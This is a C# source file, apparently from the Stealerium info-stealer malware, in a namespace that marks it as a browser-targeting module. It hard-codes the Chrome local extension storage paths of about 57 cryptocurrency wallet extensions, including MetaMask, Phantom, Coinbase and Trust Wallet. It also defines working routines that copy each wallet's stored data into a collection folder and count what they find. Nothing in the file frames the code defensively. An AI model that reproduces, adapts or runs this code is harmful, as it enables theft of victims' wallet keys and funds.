using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal class Extensions
    {
        private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
        {
    new[]
    {
        "Chrome_Authenticator",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"
    },
    new[]
    {
        "Chrome_Binance",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
    },
    new[]
    {
        "Chrome_Bitapp",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
    },
    new[]
    {
        "Chrome_BoltX",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"
    },
    new[]
    {
        "Chrome_Coin98",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
    },
    new[]
    {
        "Chrome_Coinbase",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"
    },
    new[]
    {
        "Chrome_Core",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"
    },
    new[]
    {
        "Chrome_Crocobit",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
    },
    new[]
    {
        "Chrome_Equal",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
    },
    new[]
    {
        "Chrome_Ever",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"
    },
    new[]
    {
        "Chrome_ExodusWeb3",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"
    },
    new[]
    {
        "Chrome_Fewcha",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"
    },
    new[]
    {
        "Chrome_Finnie",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
    },
    new[]
    {
        "Chrome_Guarda",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"
    },
    new[]
    {
        "Chrome_Guild",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
    },
    new[]
    {
        "Chrome_HarmonyOutdated",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"
    },
    new[]
    {
        "Chrome_Iconex",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
    },
    new[]
    {
        "Chrome_Jaxx Liberty",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"
    },
    new[]
    {
        "Chrome_Kaikas",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"
    },
    new[]
    {
        "Chrome_KardiaChain",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"
    },
    new[]
    {
        "Chrome_Keplr",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
    },
    new[]
    {
        "Chrome_Liquality",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
    },
    new[]
    {
        "Chrome_MEWCX",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"
    },
    new[]
    {
        "Chrome_MaiarDEFI",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"
    },
    new[]
    {
        "Chrome_Martian",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"
    },
    new[]
    {
        "Chrome_Math",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
    },
    new[]
    {
        "Chrome_Metamask",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    },
    new[]
    {
        "Chrome_Metamask2",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
    },
    new[]
    {
        "Chrome_Mobox",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
    },
    new[]
    {
        "Chrome_Nami",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"
    },
    new[]
    {
        "Chrome_Nifty",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
    },
    new[]
    {
        "Chrome_Oxygen",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
    },
    new[]
    {
        "Chrome_PaliWallet",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"
    },
    new[]
    {
        "Chrome_Petra",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"
    },
    new[]
    {
        "Chrome_Phantom",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
    },
    new[]
    {
        "Chrome_Pontem",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"
    },
    new[]
    {
        "Chrome_Ronin",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"
    },
    new[]
    {
        "Chrome_Safepal",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"
    },
    new[]
    {
        "Chrome_Saturn",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"
    },
    new[]
    {
        "Chrome_Slope",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
    },
    new[]
    {
        "Chrome_Solfare",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khacbfnclnjfjakompbldhceolaealdn"
    },
    new[]
    {
        "Chrome_Sollet",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
    },
    new[]
    {
        "Chrome_Starcoin",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
    },
    new[]
    {
        "Chrome_Swash",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
    },
    new[]
    {
        "Chrome_TempleTezos",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"
    },
    new[]
    {
        "Chrome_TerraStation",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"
    },
    new[]
    {
        "Chrome_Tokenpocket",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"
    },
    new[]
    {
        "Chrome_Ton",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
    },
    new[]
    {
        "Chrome_Tonkeeper",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ogaghekfbbibgpkeboogffmphcecpbga"
    },
    new[]
    {
        "Chrome_Tron",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
    },
    new[]
    {
        "Chrome_Trust Wallet",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"
    },
    new[]
    {
        "Chrome_Wombat",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"
    },
    new[]
    {
        "Chrome_XDEFI",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"
    },
    new[]
    {
        "Chrome_XMR.PT",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"
    },
    new[]
    {
        "Chrome_XinPay",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
    },
    new[]
    {
        "Chrome_Yoroi",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"
    },
    new[]
    {
        "Chrome_iWallet",
        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"
    }
};

        public static void GetChromeWallets(string sSaveDir)
        {
            try
            {
                Directory.CreateDirectory(sSaveDir);

                foreach (var array in ChromeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
            }
            catch (Exception ex)
            {
                Logging.Log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + ex);
            }
        }

        // Copy wallet files to directory
        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
        {
            var sdir = Path.Combine(sSaveDir, sWalletName);
            if (!Directory.Exists(sWalletDir)) return;
            Filemanager.CopyDirectory(sWalletDir, sdir);
            Counter.BrowserWallets++;
        }
    }
}
